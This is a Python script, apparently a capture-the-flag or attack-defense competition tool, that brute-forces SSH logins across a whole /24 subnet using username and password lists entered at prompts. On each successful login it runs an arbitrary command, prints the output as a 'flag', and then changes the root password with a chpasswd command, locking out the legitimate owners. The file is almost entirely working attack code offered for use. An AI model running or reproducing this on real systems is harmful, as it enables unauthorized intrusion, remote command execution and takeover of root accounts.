import paramiko
username=[]
passwd=[]
host = "192.168.132."

def C(cmd,newpw,username,passwd):
    for num in range(0,255):
        for i in range(0,len(username)):
            U=username[i]
            print("用户名为:",U)
            for j in range(0,len(passwd)):
                print("密码为:",U)
                P=passwd[j]
                ip = host+str(num)
                print("正在连接",ip)
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    ssh.connect(hostname=ip,port = 22,username=U,password=P,timeout=1) 
                    stdin,stdout,stderr = ssh.exec_command(cmd)
                    flag = stdout.read().decode('utf-8')
                    print("目标:"+ip+"存在漏洞，内容为:"+flag,end='')
                    print("IP:"+ip+"密码已修改成:"+newpw)
                    check="echo"+" root:"+ newpw + " | chpasswd"
                    stdin1,stdout1,stderr1 = ssh.exec_command(check)
                    ssh.close()
                except:
                    pass

def addusername(end1):
    for i in range(0,end1):
        end1=str(end1)
        i=str(i)
        Loading=input("一共输入"+end1+"个用户,请输入第"+i+"个值:")
        username.append(Loading)
        print(username)
    return username

def addpasswd(end2):
    for i in range(0,end2):
        end2=str(end2)
        i=str(i)
        Loading=input("一共输入"+end2+"个密码,请输入第"+i+"个值:")
        passwd.append(Loading)
        print(passwd)
    return passwd

if __name__=='__main__':
    cmd=input("请输入值你需要执行的命令:")
    newpw=input("需要修改的密码:")
    end1=int(input("输入一共需要几个用户:"))
    addusername(end1)
    end2=int(input("输入一共需要几个密码:"))
    addpasswd(end2)
    C(cmd,newpw,username,passwd)